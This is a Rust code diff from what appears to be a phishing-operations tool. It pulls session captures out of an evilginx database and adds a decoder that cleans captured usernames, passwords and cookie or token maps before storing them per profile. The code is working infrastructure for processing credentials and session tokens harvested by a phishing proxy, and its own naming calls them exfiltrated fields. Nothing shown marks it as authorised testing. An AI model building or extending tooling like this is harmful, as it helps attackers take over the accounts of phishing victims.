@@ -106,13 +106,74 @@ fn evilginx_db_path() -> AppResult<std::path::PathBuf> {
     )))
 }
 
+
+/// Percent-decode credential fields left encoded by older evilginx exfil parsers.
+fn decode_exfil_fields(mut rec: Value) -> Value {
+    let decode_str = |s: &str| -> String {
+        let mut out = Vec::with_capacity(s.len());
+        let b = s.as_bytes();
+        let mut i = 0usize;
+        while i < b.len() {
+            if b[i] == b'+' {
+                out.push(b' ');
+                i += 1;
+            } else if b[i] == b'%' && i + 2 < b.len() {
+                let h = |c: u8| -> Option<u8> {
+                    match c {
+                        b'0'..=b'9' => Some(c - b'0'),
+                        b'a'..=b'f' => Some(c - b'a' + 10),
+                        b'A'..=b'F' => Some(c - b'A' + 10),
+                        _ => None,
+                    }
+                };
+                if let (Some(hi), Some(lo)) = (h(b[i + 1]), h(b[i + 2])) {
+                    out.push((hi << 4) | lo);
+                    i += 3;
+                } else {
+                    out.push(b[i]);
+                    i += 1;
+                }
+            } else {
+                out.push(b[i]);
+                i += 1;
+            }
+        }
+        String::from_utf8_lossy(&out).into_owned()
+    };
+    for key in ["username", "password"] {
+        if let Some(s) = rec.get(key).and_then(|v| v.as_str()).map(|s| s.to_string()) {
+            if s.contains('%') || s.contains('+') {
+                rec[key] = json!(decode_str(&s));
+            }
+        }
+    }
+    for mapkey in ["custom", "body_tokens", "http_tokens"] {
+        let Some(obj) = rec.get(mapkey).and_then(|v| v.as_object()).cloned() else {
+            continue;
+        };
+        let mut next = serde_json::Map::new();
+        for (k, v) in obj {
+            if let Some(s) = v.as_str() {
+                if s.contains('%') || s.contains('+') {
+                    next.insert(k, json!(decode_str(s)));
+                    continue;
+                }
+            }
+            next.insert(k, v);
+        }
+        rec[mapkey] = Value::Object(next);
+    }
+    rec
+}
+
 pub fn sync_captures(profile_id: String) -> AppResult<Vec<CaptureRow>> {
     let path = evilginx_db_path()?;
     let sessions = latest_sessions_from_db(&path)?;
     for (sid, rec) in &sessions {
+        let rec = decode_exfil_fields(rec.clone());
         let create = rec.get("create_time").and_then(|v| v.as_i64());
         let update = rec.get("update_time").and_then(|v| v.as_i64());
-        db::upsert_capture(&profile_id, *sid, rec, create, update)?;
+        db::upsert_capture(&profile_id, *sid, &rec, create, update)?;
     }
     db::list_captures(&profile_id)
 }
